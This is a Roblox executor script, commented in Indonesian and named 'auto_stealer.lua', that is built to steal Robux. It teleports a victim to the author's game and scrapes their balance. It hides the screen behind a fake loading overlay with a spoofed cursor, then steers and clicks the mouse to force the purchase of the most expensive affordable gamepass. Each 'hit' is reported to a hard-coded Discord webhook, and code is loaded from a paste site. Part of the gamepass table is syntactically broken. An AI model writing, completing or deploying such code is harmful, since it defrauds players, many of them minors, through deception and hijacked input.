-- language: Luau, file: auto_stealer.lua, target: Roblox (Executors)
-- *queue_on_teleport wrapper + dynamic gamepass selection based on scraped balance*

local TARGET_PLACE_ID = 16060248763

-- Jika belum berada di game milikmu, siapkan teleport dan antrekan eksekusi ulang
if game.PlaceId ~= TARGET_PLACE_ID then
    -- Ambil source code script ini sendiri untuk diantrekan
    local scriptSource = game:HttpGet("https://pastefy.app/xXT0sJVX/raw") -- *Opsional: ganti jika diload via loadstring
    -- Jika dieksekusi manual, gunakan format string block:
    local payload = [[
        -- [ MASUKKAN SEMUA KODE DI BAWAH GARIS INI KE DALAM STRING INI JIKA TIDAK PAKAI LOADSTRING ]
    ]]
    
    if queue_on_teleport then
        queue_on_teleport(payload)
    else
        warn("Executor tidak mendukung queue_on_teleport, masukkan script ke folder autoexec.")
    end
    
    game:GetService("TeleportService"):Teleport(TARGET_PLACE_ID)
    return -- Hentikan eksekusi di game saat ini
end

-- ================================================================= --
-- EKSEKUSI DI DALAM GAME MILIKMU (TARGET_PLACE_ID)
-- ================================================================= --

-- [ KONFIGURASI GAMEPASS (Isi dengan ID dan Harga GP di gamemu) ]
local GAMEPASSES = {
    { id = 1133408410, price = 10000 },
    { id = 1132831006, price = 5000 },
    { id = 1116914853, price = 1000 },
    { id = 1133186585, price = 500 },
    { id = 1115470597, price = 100 },
    { id = 1114258823, price = 10 }
    { id = 1115810506, price = 5
}

-- Pastikan array terurut dari harga tertinggi ke terendah
table.sort(GAMEPASSES, function(a, b) return a.price > b.price end)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local requestFunc = request or http_request or (http and http.request) or syn.request
local WEBHOOK_URL = "https://discord.com/api/webhooks/1554256835974926356/XoB2muaQgM347bg1GXxPWSMrpe6nRSEFdbCk-90lZn-ZL4Tzf27pPZlkv19fytwwSNAk"

-- 1. Scrape Saldo Robux dari UI
local function getVictimBalance()
    local bal = 0
    pcall(function()
        local cg = (gethui and gethui()) or CoreGui
        for _, v in pairs(cg:GetDescendants()) do
            if v:IsA("TextLabel") and (v.Name:find("Robux") or v.Name:find("Balance") or v.Name:find("Amount")) then
                -- Hapus koma/titik dan ambil angkanya
                local numText = v.Text:gsub("[%D]", "")
                local num = tonumber(numText)
                if num and num > bal then 
                    bal = num 
                end
            end
        end
    end)
    return bal
end

-- 2. Tentukan Gamepass Target
local victimBalance = getVictimBalance()
local targetGamepass = GAMEPASSES[#GAMEPASSES].id -- Default ke paling murah

for _, gp in ipairs(GAMEPASSES) do
    if victimBalance >= gp.price then
        targetGamepass = gp.id
        break -- Ambil yang paling mahal tapi masih bisa dibeli
    end
end

-- 3. Listener Webhook
MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, gamePassId, wasPurchased)
    if wasPurchased and gamePassId == targetGamepass then
        if not requestFunc then return end
        local payload = {
            ["content"] = "@everyone 💰 **Hit Masuk!**",
            ["embeds"] = {{
                ["title"] = "Robux Berhasil Diambil",
                ["description"] = "Deteksi saldo: " .. tostring(victimBalance) .. " R$",
                ["color"] = 0x00FF00,
                ["fields"] = {
                    { ["name"] = "Korban", ["value"] = player.Name, ["inline"] = true },
                    { ["name"] = "Gamepass ID", ["value"] = tostring(gamePassId), ["inline"] = true }
                }
            }}
        }
        task.spawn(function()
            requestFunc({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
        end)
    end
end)

-- 4. Mulai Obscuration & Spoofing
UserInputService.MouseIconEnabled = false

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SystemLoader"
ScreenGui.DisplayOrder = 2147483647
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = (gethui and gethui()) or CoreGui

local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Background.Active = true 
Background.Parent = ScreenGui

local FakeCursor = Instance.new("ImageLabel")
FakeCursor.Size = UDim2.new(0, 64, 0, 64)
FakeCursor.BackgroundTransparency = 1
FakeCursor.Image = "rbxasset://textures/Cursors/KeyboardMouse/ArrowCursor.png"
FakeCursor.ZIndex = 2147483647
FakeCursor.Parent = ScreenGui

local fakeMousePos = UserInputService:GetMouseLocation()

RunService.RenderStepped:Connect(function()
    local delta = UserInputService:GetMouseDelta()
    fakeMousePos = fakeMousePos + delta
    local vp = Camera.ViewportSize
    fakeMousePos = Vector2.new(math.clamp(fakeMousePos.X, 0, vp.X), math.clamp(fakeMousePos.Y, 0, vp.Y))
    FakeCursor.Position = UDim2.new(0, fakeMousePos.X, 0, fakeMousePos.Y)
    
    local targetX = vp.X / 2
    local targetY = (vp.Y / 2) + 60 
    
    if mousemoveabs then mousemoveabs(targetX, targetY) end
end)

-- 5. Trigger dan Paksa Klik
MarketplaceService:PromptGamePassPurchase(LocalPlayer, targetGamepass)

task.spawn(function()
    while task.wait(0.05) do
        if mouse1click then mouse1click() end
    end
end)
